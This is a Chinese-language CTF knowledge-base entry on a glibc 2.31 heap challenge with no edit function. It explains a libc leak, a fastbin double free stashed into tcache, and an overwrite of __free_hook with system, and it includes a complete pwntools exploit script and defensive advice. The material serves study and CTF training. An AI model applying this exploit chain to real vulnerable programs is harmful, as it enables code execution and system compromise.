---
id: binary-pwn-heap-glibc231-fastbin-stash-tcache-freehook-system
title: glibc 2.31 无 edit 堆题：fastbin 双 free 后倒灌 tcache，重叠块改 fd 打 __free_hook→system
type: scenario
domain: binary
path: binary/pwn/heap
technique: glibc231-fastbin-dup-tcache-stash-freehook-system
aliases:
- 2.31 无 edit 堆题
- fastbin 倒灌 tcache
- fastbin dup 打 free_hook
- tcache stash 利用
- fastnote
- free_hook system
tags:
- pwn
- heap
- glibc-2.31
- tcache
- fastbin
- double-free
- free-hook
- overlapping-chunk
- ctf
cve: []
severity: high
confidence: high
affected_versions: glibc 2.31（原文：GLIBC_2.31-0ubuntu9.14）
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V532
  verified_at: '2026-11-11T17:13:37+08:00'
  notes: 已对照原文13198与截图核对：fastnote为GLIBC 2.31-0ubuntu9.14（img35），add限制size<=0x80且add时write内容、无edit（img53），stage1 9个0x90块释放8个后tcache满7、chunk0进unsorted泄libc-0x1ecbe0（img54/46），stage2 0x70块fastbin dup自环2→1→2（img55），倒灌tcache后写free_hook→system、free('/bin/sh')（img56/57），与原文exp逐步一致。affected_versions已标glibc 2.31（原文9.14）。dedup候选均为有edit/UAF或tcache key/counts链，非同链。
---

## 一句话结论

glibc 2.31 下题目只允许申请 ≤0x80、没有 edit，但 add 时可以直接写入内容：先用 0x90 块填满 tcache 把第 8 块挤进 unsorted bin，show 泄 libc；再用 0x70 块填满 tcache 后把多出的块 free 进 fastbin，对非栈顶块 double free 形成 fastbin dup，随后 malloc 触发 fastbin 倒灌 tcache，在返回块的起始处写入 `__free_hook` 覆盖 fd，使后续分配落到 `__free_hook` 并写入 `system`，最后 free 一个内容为 `/bin/sh` 的块拿到 shell。

## 原理

- **无 edit 也能写已释放块**：程序没有 edit 功能，但 `add` 在 malloc 之后立即 `read(0, notes[idx], size)`，攻击者可以先 free 再重新申请同一块，或在返回的块上写内容；当返回块与仍挂在 bin 里的块重叠时，写入即覆盖其 `fd`。
- **第一阶段泄 libc**：先申请 9 个 0x80（chunk size 0x90）块，按 7→0 逆序 free。tcache 每个 size 最多 7 块，前 7 次 free 填满 tcache，第 8 次（chunk 0）进入 unsorted bin；`show(0)` 读出 chunk 0 的 `fd`（`main_arena+96`），减去 0x1ecbe0 得到 libc 基址。
- **第二阶段制造 fastbin dup**：申请 10 个 0x60（chunk size 0x70）块，逆序 free 9 个：前 7 个进 tcache，后 2 个进 fastbin；再 `delete(2)` 对已在 fastbin 中、且不是当前 fastbin 栈顶的 chunk 2 再次 free——2.31 的 fastbin double-free 检查只比较“待 free 块是否等于当前栈顶”，chunk 2 不是栈顶，检查通过，fastbin 链变成 2→1→2 的环。
- **fastbin 倒灌 tcache**：先把 tcache 中的 0x70 块分配掉（add 5、6），下一次 malloc 从 fastbin 取块时，glibc 会把 fastbin 中剩余块搬进 tcache（tcache stashing），并把取出的块返回；在返回块起始处写入 `p64(__free_hook)` 就覆盖了链中下一块的 `fd`。
- **打 __free_hook**：继续 malloc 消费 tcache 中的块，最终一次分配返回 `__free_hook`，写入 `system`；此前已把某个块内容写成 `/bin/sh`，`free` 该块即调用 `system("/bin/sh")`。
- **为什么 2.31 可行**：2.31 无 safe-linking（fd 不加密）、仍保留 `__free_hook`；2.32+ 引入 safe-linking、2.34+ 移除 hooks，同类链需要换 FSOP/IO 链。

## 触发条件

- glibc 2.31（原文 2.31-0ubuntu9.14），tcache 启用，无 safe-linking。
- 程序提供 add（申请后读入内容）、show、delete，size 上限 ≤0x80，无 edit。
- 能触发 tcache/fastbin 的填充与重复 free（删除不置空或索引可重复 free）。
- 可泄露堆/unsorted 指针（show 已释放块）。

## 利用步骤

1. 申请 9 个 0x80 块，逆序 free 8 个（7..0），让 chunk 0 进 unsorted bin；`show(0)` 泄 libc，`libc_base = leak - 0x1ecbe0`。
2. 申请 10 个 0x60 块，逆序 free 9 个（9..1）；再 `delete(2)` 制造 fastbin dup（2→1→2）。
3. 从 tcache 分配 5 个 0x60 块（消耗 tcache），再 add 5 内容 `/bin/sh`、add 6 内容 `aaaa`。
4. add 7 时 malloc 遍历 fastbin 并把剩余块倒灌 tcache，在返回块写入 `p64(__free_hook)`，覆盖链中下一块的 fd。
5. add 8、9 消费 tcache；add 10 返回 `__free_hook`，写入 `p64(system)`。
6. `delete(5)` free 内容为 `/bin/sh` 的块，触发 `system("/bin/sh")`。

## PoC

```python
from pwn import *
context.arch = 'amd64'
p = process('./pwn')
libc = ELF('./libc-2.31.so')

def add(i, size, content):
    p.sendlineafter(b'Your choice:', b'1')
    p.sendlineafter(b'Index: ', str(i).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Content: ', content)

def delete(i):
    p.sendlineafter(b'Your choice:', b'3')
    p.sendlineafter(b'Index: ', str(i).encode())

def show(i):
    p.sendlineafter(b'Your choice:', b'2')
    p.sendlineafter(b'Index: ', str(i).encode())

for i in range(9):
    add(i, 0x80, b'aaaa')
for i in range(8):
    delete(7 - i)

show(0)
libc_base = u64(p.recvuntil(b'\x7f').ljust(8, b'\x00')) - 0x1ecbe0
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

for i in range(10):
    add(i, 0x60, b'aaaa')
for i in range(9):
    delete(9 - i)
delete(2)                       # fastbin dup: 2 -> 1 -> 2

for i in range(5):              # 消耗 tcache 中的 0x70 块
    add(i, 0x60, b'aaaa')

add(5, 0x60, b'/bin/sh\x00')
add(6, 0x60, b'aaaa')
add(7, 0x60, p64(free_hook))    # 写入返回块起始处，覆盖链中 fd
add(8, 0x60, b'aaaa')
add(9, 0x60, b'aaaa')
add(10, 0x60, p64(system))      # 分配到 __free_hook，写入 system
delete(5)                       # free('/bin/sh') -> system('/bin/sh')
p.interactive()
```

## 变体与关联

- **直接 tcache 毒化变体**：有 edit、可直接改已释放块 fd 时无需 fastbin dup，见 [[ctf-pwn-menu-uaf-heap-overflow-tcache-poison-freehook-system]]、[[binary-pwn-heap-glibc231-tcache-key-clear-repeated-free-freehook]]。
- **2.35 safe-linking 变体**：fastbin reverse into tcache 需要恰好 7 块并处理 fd 加密，见 [[binary-pwn-heap-glibc235-fastbin-reverse-into-tcache-last-fd-arbitrary-alloc]]。
- **2.31 tcache counts 校验**：直接把 fd 改成 hook 时需至少两个同尺寸块通过 counts 检查，见 [[binary-pwn-heap-glibc231-tcache-counts-malloc-hook-onegadget]]。
- **2.23 无 tcache 变体**：fastbin dup 直接打 `__malloc_hook-0x23` + one_gadget，见 [[binary-pwn-heap-glibc223-uaf-fastbin-dup-malloc-hook-realloc-onegadget]]。

## 检测与防御

- **检测/审计**：add 后立即读入内容且允许重复申请已释放索引；delete 不置空；大小上限覆盖 tcache/fastbin 尺寸；show 可读已释放块 fd/unsorted 指针。
- **防御**：升级 glibc 到 2.32+（safe-linking）或 2.34+（移除 hooks）；对已释放索引置空并禁止重复 free；启用 tcache double-free key 检查（2.29+ 默认）；堆分配器加 canary/隔离；CTF 之外避免使用 `__free_hook` 等全局 hook。
